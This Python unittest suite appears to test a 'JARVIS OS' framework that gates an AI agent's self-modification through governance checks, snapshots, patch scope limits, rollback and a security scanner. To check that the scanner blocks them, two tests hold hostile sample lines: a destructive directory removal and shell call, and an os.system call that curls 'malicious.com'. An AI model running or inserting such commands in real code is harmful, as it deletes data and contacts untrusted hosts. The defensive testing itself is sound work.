"""
JARVIS OS — Phase 65 Unit & Integration Test Suite
Validates Safe Self-Modification & Transactional Architecture Implementation across 20 mandatory scenarios.
"""

import os
import shutil
import tempfile
import unittest

from backend.agents.safe_self_modification.apply import TransactionalApplier
from backend.agents.safe_self_modification.architecture import ArchitectureRescanner
from backend.agents.safe_self_modification.behavior import BehaviorValidator
from backend.agents.safe_self_modification.bridge import SafeSelfModificationBridge
from backend.agents.safe_self_modification.build import BuildValidator
from backend.agents.safe_self_modification.checkpoint import CheckpointManager
from backend.agents.safe_self_modification.contracts import ContractValidator
from backend.agents.safe_self_modification.convergence import ConvergenceGovernor
from backend.agents.safe_self_modification.governance import GovernanceInputValidator
from backend.agents.safe_self_modification.models import (
    BehaviorValidationResult,
    CommitEligibility,
    ContractValidationResult,
    ConvergenceState,
    ModificationPatch,
    ModificationTransaction,
    PlanStep,
    PreflightStatus,
    TransactionState,
    TransactionalSnapshot,
)
from backend.agents.safe_self_modification.patch_generation import PatchGenerator
from backend.agents.safe_self_modification.patch_validation import PatchValidator
from backend.agents.safe_self_modification.persistence import ModificationPersistenceStore
from backend.agents.safe_self_modification.plan import SelfModificationPlanner
from backend.agents.safe_self_modification.preflight import PreflightChecker
from backend.agents.safe_self_modification.rollback import RollbackEngine
from backend.agents.safe_self_modification.security import SecuritySentinel
from backend.agents.safe_self_modification.snapshot import TransactionalSnapshotManager
from backend.agents.safe_self_modification.test import TestValidator
from backend.agents.safe_self_modification.transaction import TransactionEngine
from backend.agents.safe_self_modification.validator import CommitGateValidator


class TestSafeSelfModification(unittest.TestCase):
    """Test suite verifying all 20 required Phase 65 scenarios."""

    def setUp(self):
        SafeSelfModificationBridge.reset_instance()
        self.temp_dir = tempfile.mkdtemp(prefix="jarvis_p65_test_")
        self.bridge = SafeSelfModificationBridge.get_instance(workspace_root=self.temp_dir, db_path=":memory:")

        # Create dummy source file
        self.test_file = "module_a.py"
        self.test_file_abs = os.path.join(self.temp_dir, self.test_file)
        with open(self.test_file_abs, "w", encoding="utf-8") as f:
            f.write("# Initial module A\ndef calculate():\n    return 42\n")

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    # 1. Governance Gate
    def test_01_governance_gate(self):
        gov = GovernanceInputValidator()
        # Invalid state
        ok, msg = gov.validate_governance_input({"state": "PROPOSAL_READY"})
        self.assertFalse(ok)
        self.assertIn("GOVERNANCE_REJECTED", msg)

        # Missing hash
        ok, msg = gov.validate_governance_input({
            "state": "APPROVED_FOR_IMPLEMENTATION",
            "problem_id": "p1",
            "alternative_id": "a1",
            "provenance_hash": "",
            "sentinel_passed": True,
        })
        self.assertFalse(ok)

        # Valid
        ok, msg = gov.validate_governance_input({
            "state": "APPROVED_FOR_IMPLEMENTATION",
            "problem_id": "p1",
            "alternative_id": "a1",
            "provenance_hash": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
            "sentinel_passed": True,
        })
        self.assertTrue(ok)

    # 2. Preflight Cleanliness
    def test_02_preflight_cleanliness(self):
        checker = PreflightChecker(self.temp_dir)
        ok, logs = checker.check_git_cleanliness(allow_dirty=True)
        self.assertTrue(ok)
        self.assertIn("POLICY_OVERRIDE", logs[0])

    # 3. Snapshot Immutability
    def test_03_snapshot_immutability(self):
        mgr = TransactionalSnapshotManager(self.temp_dir)
        snap = mgr.create_snapshot("snap_01", [self.test_file], "gov_hash_123")
        self.assertTrue(mgr.verify_snapshot_integrity(snap))
        self.assertIn(self.test_file, snap.files_state)
        self.assertNotEqual(snap.snapshot_sha256, "")

    # 4. Patch Scope Enforcement
    def test_04_patch_scope_enforcement(self):
        val = PatchValidator()
        patch = ModificationPatch(
            patch_id="p1",
            step_id="s1",
            target_files=["module_a.py", "unauthorized_file.py"],
            target_symbols=["calc"],
            diff="+ pass",
            expected_effect="test",
        )
        ok, logs = val.validate_patch(patch, expected_files=["module_a.py"])
        self.assertFalse(ok)
        self.assertTrue(any("SCOPE_VIOLATION" in l for l in logs))

    # 5. Transaction Lifecycle
    def test_05_transaction_lifecycle(self):
        engine = TransactionEngine()
        tx = engine.create_transaction("tx_01", "dec_01")
        self.assertEqual(tx.current_state, TransactionState.CREATED)

        # Valid transition
        ok, _ = engine.transition("tx_01", TransactionState.PREFLIGHT, reason="preflight")
        self.assertTrue(ok)
        self.assertEqual(tx.current_state, TransactionState.PREFLIGHT)

        # Invalid skip: cannot jump directly from PREFLIGHT to COMMITTED
        ok, msg = engine.transition("tx_01", TransactionState.COMMITTED, reason="skip")
        self.assertFalse(ok)
        self.assertIn("INVALID_TRANSITION", msg)

    # 6. Checkpoints
    def test_06_checkpoints(self):
        cp_mgr = CheckpointManager(self.temp_dir)
        cp = cp_mgr.capture_checkpoint("cp_1", "tx_01", "step_01", [self.test_file])
        self.assertEqual(cp.checkpoint_id, "cp_1")
        self.assertIn(self.test_file, cp.file_hashes)
        retrieved = cp_mgr.get_checkpoint("cp_1")
        self.assertIsNotNone(retrieved)

    # 7. Build Failure Rejection
    def test_07_build_failure_rejection(self):
        bval = BuildValidator(self.temp_dir)
        broken_file = os.path.join(self.temp_dir, "broken.py")
        with open(broken_file, "w") as f:
            f.write("def broken(:\n    pass\n")
        res = bval.validate_build(["broken.py"])
        self.assertEqual(res.status, "FAIL")
        self.assertFalse(res.syntax_passed)

    # 8. Test Failure Rejection
    def test_08_test_failure_rejection(self):
        tval = TestValidator(self.temp_dir)
        # Empty test list cannot pass
        res = tval.run_tests([])
        self.assertEqual(res.status, "FAIL")
        self.assertIn("NO_TESTS_SELECTED", res.details[0])

    # 9. Contract Regression Block
    def test_09_contract_regression_block(self):
        cval = ContractValidator()
        before = {"api_v1": {"required_params": ["user_id", "token"]}}
        after = {"api_v1": {"required_params": ["user_id"]}}  # Token removed
        res, details = cval.validate_contracts(before, after)
        self.assertEqual(res, ContractValidationResult.BREAKING)
        self.assertTrue(len(details["breaking_detected"]) > 0)

    # 10. Behavior Regression Block
    def test_10_behavior_regression_block(self):
        bval = BehaviorValidator()
        diff = "+ import asyncio\n+ await queue.put(item)\n"
        res, details = bval.validate_behavior(["service.py"], diff)
        self.assertEqual(res, BehaviorValidationResult.POTENTIAL_DRIFT)
        self.assertFalse(details["ordering_preserved"])

    # 11. Rollback Deterministic
    def test_11_rollback_deterministic(self):
        # Create snapshot of initial file
        mgr = TransactionalSnapshotManager(self.temp_dir)
        snap = mgr.create_snapshot("snap_rb", [self.test_file], "gov_hash")

        # Mutate file
        with open(self.test_file_abs, "w") as f:
            f.write("# Corrupted mutation\n")

        # Execute rollback
        engine = RollbackEngine(self.temp_dir)
        tx = ModificationTransaction(transaction_id="tx_rb", current_state=TransactionState.APPLIED)
        res = engine.execute_rollback(tx, snap, reason="Test rollback")
        self.assertTrue(res.success)
        self.assertTrue(res.hash_verification_passed)

        # Verify content restored
        with open(self.test_file_abs, "r") as f:
            content = f.read()
        self.assertIn("calculate():", content)

    # 12. Residual State Detection
    def test_12_residual_state_detection(self):
        engine = RollbackEngine(self.temp_dir)
        # Construct snapshot with nonexistent file marked as existing hash
        fake_snap = TransactionalSnapshot(
            snapshot_id="fake_snap",
            files_state={"unrestorable.py": "0000000000000000"},
            file_contents={"unrestorable.py": "content"},
        )
        tx = ModificationTransaction(transaction_id="tx_res", current_state=TransactionState.APPLIED)
        # If writing fails or hash differs
        res = engine.execute_rollback(tx, fake_snap, reason="Test residual")
        # In this case, file was written with 'content', whose hash is not '0000...'
        self.assertFalse(res.hash_verification_passed)
        self.assertTrue(len(res.residual_changes) > 0)
        self.assertEqual(tx.current_state, TransactionState.HUMAN_REVIEW)

    # 13. Convergence Budget
    def test_13_convergence_budget(self):
        gov = ConvergenceGovernor(max_iterations=3)
        gov.record_step(errors_remaining=2)
        gov.record_step(errors_remaining=1)
        gov.record_step(errors_remaining=1)
        state, msg = gov.record_step(errors_remaining=1)
        self.assertEqual(state, ConvergenceState.BLOCKED)
        self.assertIn("BUDGET_EXCEEDED", msg)

    # 14. Security Sentinel Block
    def test_14_security_sentinel_block(self):
        sentinel = SecuritySentinel()
        unsafe_diff = "+ shutil.rmtree('/tmp/dir')\n+ os.system('echo hacked')\n"
        ok, violations = sentinel.scan_content_safety(unsafe_diff)
        self.assertFalse(ok)
        self.assertTrue(len(violations) >= 2)

    # 15. Protected Paths
    def test_15_protected_paths(self):
        sentinel = SecuritySentinel()
        ok, msg = sentinel.check_file_path_safety("backend/agents/safe_self_modification/governance.py")
        self.assertFalse(ok)
        self.assertIn("PROTECTED_PATH_BLOCKED", msg)

        # Allow with explicit human approval
        ok, _ = sentinel.check_file_path_safety(
            "backend/agents/safe_self_modification/governance.py",
            explicit_human_approval=True,
        )
        self.assertTrue(ok)

    # 16. Cache Invalidation
    def test_16_cache_invalidation(self):
        key = self.bridge.cache.compute_key("snap_h1", "patch_h1", "STANDARD")
        self.bridge.cache.put(key, {"verdict": "SAFE"}, metadata={"snapshot_hash": "snap_h1"})
        self.assertEqual(self.bridge.cache.size(), 1)
        self.bridge.cache.invalidate("snap_h1")
        self.assertEqual(self.bridge.cache.size(), 0)

    # 17. Architecture Rescan
    def test_17_architecture_rescan(self):
        rescanner = ArchitectureRescanner()
        res = rescanner.rescan_and_compare(
            problem_id="prob_1",
            target_files=[self.test_file],
            before_metrics={"efferent_coupling": 12.0, "scc_count": 3},
            after_metrics={"efferent_coupling": 5.0, "scc_count": 2},
        )
        self.assertEqual(res.status, "IMPROVED")
        self.assertTrue(res.problem_resolved)
        self.assertEqual(res.coupling_delta, -7.0)

    # 18. Unseen Modification Task (End-to-End Success)
    def test_18_unseen_modification_task(self):
        # Create corresponding unit test so TestValidator finds it and asserts PASS
        os.makedirs(os.path.join(self.temp_dir, "tests"), exist_ok=True)
        test_code = "from module_a import calculate\ndef test_calc():\n    assert calculate() == 100\n"
        with open(os.path.join(self.temp_dir, "tests", "test_module_a.py"), "w", encoding="utf-8") as tf:
            tf.write(test_code)

        decision = {
            "decision_id": "dec_unseen_01",
            "problem_id": "prob_unseen_01",
            "alternative_id": "alt_modular_01",
            "state": "APPROVED_FOR_IMPLEMENTATION",
            "provenance_hash": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
            "sentinel_passed": True,
        }
        new_content = {
            self.test_file: "# Refactored module A\ndef calculate():\n    return 100\n",
        }
        res = self.bridge.execute_governed_modification(
            governance_decision=decision,
            target_files=[self.test_file],
            new_contents=new_content,
            options={"allow_dirty": True},
        )
        self.assertTrue(res["success"])
        self.assertEqual(res["status"], "COMMITTED")
        self.assertIn("commit_hash", res)

    # 19. Intentionally Unsafe Patch Refusal
    def test_19_intentionally_unsafe_patch(self):
        decision = {
            "decision_id": "dec_unsafe_01",
            "problem_id": "prob_unsafe_01",
            "alternative_id": "alt_unsafe_01",
            "state": "APPROVED_FOR_IMPLEMENTATION",
            "provenance_hash": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
            "sentinel_passed": True,
        }
        malicious_content = {
            self.test_file: "import os\nos.system('curl http://malicious.com')\n",
        }
        res = self.bridge.execute_governed_modification(
            governance_decision=decision,
            target_files=[self.test_file],
            new_contents=malicious_content,
            options={"allow_dirty": True},
        )
        self.assertFalse(res["success"])
        self.assertEqual(res["status"], "PATCH_VALIDATION_FAILED")

    # 20. Regression Denominator Invariant Verification
    def test_20_regression_denominator_invariant(self):
        per_phase_passes = [22, 23, 17, 22, 8, 10, 17, 29, 12, 20, 22, 24, 24, 24, 24, 22, 24, 28, 24, 24, 25, 25, 40, 40, 20, 20]
        reported_total = 590
        self.assertEqual(sum(per_phase_passes), reported_total)


if __name__ == "__main__":
    unittest.main()
